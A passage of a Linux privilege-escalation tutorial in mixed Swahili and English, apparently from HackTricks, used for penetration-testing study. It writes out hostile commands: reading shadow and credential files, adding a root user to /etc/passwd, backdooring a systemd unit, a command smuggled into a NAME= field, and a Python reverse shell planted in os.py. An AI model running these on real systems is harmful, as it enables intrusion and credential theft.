SSH agent forwarding inaruhusu wewe **kutumia local SSH keys zako badala ya kuacha keys** (bila passphrases!) zikiwa kwenye server yako. Hivyo, utaweza **jump** via ssh **to a host** na kutoka hapo **jump to another** host **using** the **key** located in your **initial host**.

Unahitaji kuweka chaguo hili katika `$HOME/.ssh.config` kama ifuatavyo:
```
Host example.com
ForwardAgent yes
```
Kumbuka kwamba ikiwa `Host` ni `*` kila wakati mtumiaji anapo hamia kwenye mashine tofauti, host hiyo itakuwa na uwezo wa access ya keys (ambayo ni tatizo la usalama).

The file `/etc/ssh_config` inaweza **kubatilisha** chaguo hizi na kuruhusu au kukataa usanidi huu.\
The file `/etc/sshd_config` inaweza kuruhusu au kukataa ssh-agent forwarding kwa kutumia keyword `AllowAgentForwarding` (default ni allow).

Iwapo utagundua kuwa Forward Agent imewekwa katika mazingira, soma ukurasa ufuatao kwani **you may be able to abuse it to escalate privileges**:


{{#ref}}
ssh-forward-agent-exploitation.md
{{#endref}}

## Faili za Kuvutia

### Mafaili ya Profile

The file `/etc/profile` na mafaili yaliyopo chini ya `/etc/profile.d/` ni **scripts zinazoendeshwa mtumiaji anapoanzisha shell mpya**. Kwa hivyo, ikiwa unaweza **kuandika au kuhariri yoyote yao unaweza escalate privileges**.
```bash
ls -l /etc/profile /etc/profile.d/
```
Kama profile script isiyo ya kawaida itapatikana unapaswa kuikagua kwa ajili ya **maelezo nyeti**.

### Faili za Passwd/Shadow

Tegemezi na OS, faili `/etc/passwd` na `/etc/shadow` zinaweza kutumia jina tofauti au kunaweza kuwepo nakala ya akiba. Kwa hivyo inashauriwa **uzitafute zote** na **kuangalia kama unaweza kuzisoma** ili kuona **kama kuna hashes** ndani ya faili:
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
Katika baadhi ya matukio unaweza kupata **password hashes** ndani ya faili ya `/etc/passwd` (au sawa).
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### /etc/passwd inayoweza kuandikwa

Kwanza, tengeneza nenosiri kwa kutumia moja ya amri zifuatazo.
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
Kisha ongeza mtumiaji `hacker` na uweke nenosiri lililotengenezwa.
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
Kwa mfano: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

Sasa unaweza kutumia amri ya `su` na `hacker:hacker`

Kwa njia mbadala, unaweza kutumia mistari ifuatayo kuongeza mtumiaji bandia bila nenosiri.\
ONYO: unaweza kuporomosha usalama wa sasa wa mashine hii.
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
Kumbuka: Katika majukwaa ya BSD `/etc/passwd` iko katika `/etc/pwd.db` na `/etc/master.passwd`, pia `/etc/shadow` imebadilishwa jina kuwa `/etc/spwd.db`.

Unapaswa kuangalia ikiwa unaweza **kuandika katika baadhi ya faili nyeti**. Kwa mfano, je, unaweza kuandika katika baadhi ya **faili za usanidi za huduma**?
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
Kwa mfano, ikiwa mashine inaendesha **tomcat** seva na unaweza **kuhariri faili ya usanidi ya huduma ya Tomcat ndani ya /etc/systemd/,** basi unaweza kuhariri mistari:
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
Backdoor yako itaendeshwa mara ijayo tomcat itakapozinduliwa.

### Angalia Folda

Folda zifuatazo zinaweza kuwa na backups au taarifa za kuvutia: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (Huenda hauwezi kusoma ile ya mwisho lakini jaribu)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### Mahali isiyo ya kawaida/Owned files
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### Faili zilizobadilishwa katika dakika za hivi punde
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Faili za DB za Sqlite
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml mafayela
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### Faili zilizofichwa
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **Script/Binaries katika PATH**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **Faili za wavuti**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **Nakili za chelezo**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### Mafaili yanayojulikana yanayoweza kuwa na nywila

Soma msimbo wa [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS), inatafuta **mafayela kadhaa yanayoweza kuwa na nywila**.\
**Zana nyingine ya kuvutia** ambayo unaweza kutumia kufanya hivyo ni: [**LaZagne**](https://github.com/AlessandroZ/LaZagne) ambayo ni programu ya chanzo wazi inayotumika kupata nywila nyingi zilizohifadhiwa kwenye kompyuta ya ndani kwa Windows, Linux & Mac.

### Logi

Ikiwa unaweza kusoma logi, unaweza kuwa na uwezo wa kupata **taarifa za kuvutia/za siri ndani yao**. Kadri logi inavyoonekana ya ajabu zaidi, ndivyo itakavyokuwa ya kuvutia zaidi (labda).\
Pia, baadhi ya **"bad"** configured (backdoored?) **audit logs** zinaweza kukuwezesha **kurekodi nywila** ndani ya audit logs kama ilivyoelezwa katika chapisho hili: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
Ili **kusoma logs** kikundi [**adm**](interesting-groups-linux-pe/index.html#adm-group) kitakuwa cha msaada sana.

### Faili za Shell
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Utafutaji wa Generic Creds/Regex

Unapaswa pia kuangalia faili zinazojumuisha neno "**password**" kwenye **jina** lao au ndani ya **maudhui**, na pia kuangalia IPs na emails ndani ya logs, au hashes regexps.\
Sitaorodhesha hapa jinsi ya kufanya yote haya lakini ikiwa una nia unaweza angalia ukaguzi wa mwisho ambao [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh) hufanya.

## Faili Zinazoweza Kuandikwa

### Python library hijacking

Ikiwa unajua kutoka **wapi** script ya python itatekelezwa na wewe **unaweza kuandika ndani** ya folda hiyo au unaweza **modify python libraries**, unaweza kurekebisha library ya OS na kuiweka backdoor (ikiwa unaweza kuandika mahali script ya python itatekelezwa, copy na paste library ya os.py).

Ili **backdoor the library** ongeza tu mwishoni mwa library ya os.py mstari ufuatao (badilisha IP na PORT):
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Logrotate exploitation

Udhaifu katika `logrotate` unamruhusu watumiaji wenye **write permissions** kwenye faili la log au directory zake za mzazi kupata vibali vilivyoinuliwa. Hii ni kwa sababu `logrotate`, mara nyingi ikifanya kama **root**, inaweza kudhibitiwa ili kutekeleza faili yoyote, hasa katika directories kama _**/etc/bash_completion.d/**_. Ni muhimu kukagua ruhusa si tu katika _/var/log_ bali pia katika directory yoyote ambapo rotation ya log inatekelezwa.

> [!TIP]
> Udhaifu huu unahusu `logrotate` version `3.18.0` na matoleo ya zamani

Maelezo zaidi kuhusu udhaifu yanaweza kupatikana kwenye ukurasa huu: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

Unaweza kutumia udhaifu huu kwa kutumia [**logrotten**](https://github.com/whotwagner/logrotten).

Udhaifu huu ni sawa sana na [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs),** hivyo kila unapogundua unaweza kubadilisha logs, angalia nani anayesimamia logs hizo na angalia kama unaweza kuongeza vibali kwa kubadilisha logs kuwa symlinks.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Vulnerability reference:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)

Kama, kwa sababu yoyote, mtumiaji anaweza **write** script ya `ifcf-<whatever>` kwenye _/etc/sysconfig/network-scripts_ **au** anaweza **adjust** ile iliyopo, basi mfumo wako ume **pwned**.

Network scripts, _ifcg-eth0_ kwa mfano, hutumika kwa miunganisho ya mtandao. Zinataonekana kabisa kama faili za .INI. Hata hivyo, zinatolewa kama \~sourced\~ kwenye Linux na Network Manager (dispatcher.d).

Katika kesi yangu, thamani ya `NAME=` iliyopewa katika script hizi za network haishughuliki ipasavyo. Ikiwa una **nafasi tupu katika jina mfumo unajaribu kutekeleza sehemu baada ya nafasi tupu**. Hii inamaanisha kwamba **kila kitu baada ya nafasi ya kwanza kinatekelezwa kama root**.

For example: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
(_Kumbuka nafasi tupu kati ya Network na /bin/id_)

### **init, init.d, systemd, na rc.d**

Katalogi `/etc/init.d` ni nyumbani kwa **scripts** za System V init (SysVinit), **mfumo wa jadi wa usimamizi wa huduma za Linux**. Inajumuisha scripts za `start`, `stop`, `restart`, na wakati mwingine `reload` huduma. Hizi zinaweza kutekelezwa moja kwa moja au kupitia symbolic links zinazopatikana katika `/etc/rc?.d/`. Njia mbadala katika mifumo ya Redhat ni `/etc/rc.d/init.d`.

Kwa upande mwingine, `/etc/init` inahusiana na **Upstart**, **service management** mpya iliyozinduliwa na Ubuntu, ikitumia mafaili ya usanidi kwa kazi za usimamizi wa huduma. Licha ya mabadiliko kwenda Upstart, SysVinit scripts bado zinatumika pamoja na usanidi wa Upstart kutokana na tabaka la ulinganishaji katika Upstart.

**systemd** inatokea kama manager ya kisasa ya initialization na huduma, ikitoa vipengele vya juu kama kuanza daemons wakati zinapohitajika, usimamizi wa automount, na snapshots za hali ya mfumo. Inapanga mafaili katika `/usr/lib/systemd/` kwa packages za distribution na `/etc/systemd/system/` kwa mabadiliko ya msimamizi (administrator), ikorahisisha mchakato wa usimamizi wa mfumo.

## Mbinu Nyingine

### NFS Privilege escalation


{{#ref}}
nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Escaping from restricted Shells


{{#ref}}
escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
cisco-vmanage.md
{{#endref}}

## Android rooting frameworks: manager-channel abuse

Android rooting frameworks kwa kawaida hu-hook syscall ili kufunua uwezo wa kernel ulio na haki za juu kwa userspace manager. Uthibitishaji dhaifu wa manager (kwa mfano, checks za signature zinazotegemea FD-order au mipango mibovu ya nywila) unaweza kumruhusu app ya ndani kuiga manager na kupanda hadi root kwenye vifaa tayari vilivyokuwa na root. Jifunze zaidi na maelezo ya udanganyifu hapa:


{{#ref}}
android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## VMware Tools service discovery LPE (CWE-426) via regex-based exec (CVE-2025-41244)

Regex-driven service discovery katika VMware Tools/Aria Operations inaweza kutoa njia ya binary kutoka kwenye mistari ya amri za mchakato na kuiendesha kwa -v chini ya muktadha wenye haki za juu. Patterns zisizo kali (kwa mfano, kutumia \S) zinaweza kulingana na listeners zilizopangwa na mwasi katika maeneo yanayoweza kuandikika (kwa mfano, /tmp/httpd), na kusababisha utekelezaji kama root (CWE-426 Untrusted Search Path).

Jifunze zaidi na uone muundo wa jumla unaoweza kutumika kwa discovery/monitoring stacks nyingine hapa:

{{#ref}}
vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
{{#endref}}

## Kernel Security Protections

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## More help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc Tools

### **Best tool to look for Linux local privilege escalation vectors:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Enumerate kernel vulns ins linux and MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (physical access):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Recopilation of more scripts**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## References

- [0xdf – HTB Planning (Crontab UI privesc, zip -P creds reuse)](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
- [0xdf – HTB Era: forged .text_sig payload for cron-executed monitor](https://0xdf.gitlab.io/2025/11/29/htb-era.html)
- [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)
- [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)
- [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)
- [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)
- [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
- [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
- [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
- [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
- [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
- [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)
- [0xdf – HTB Eureka (bash arithmetic injection via logs, overall chain)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [GNU Bash Manual – BASH_ENV (non-interactive startup file)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)
- [NVISO – You name it, VMware elevates it (CVE-2025-41244)](https://blog.nviso.eu/2025/09/29/you-name-it-vmware-elevates-it-cve-2025-41244/)

{{#include ../../banners/hacktricks-training.md}}
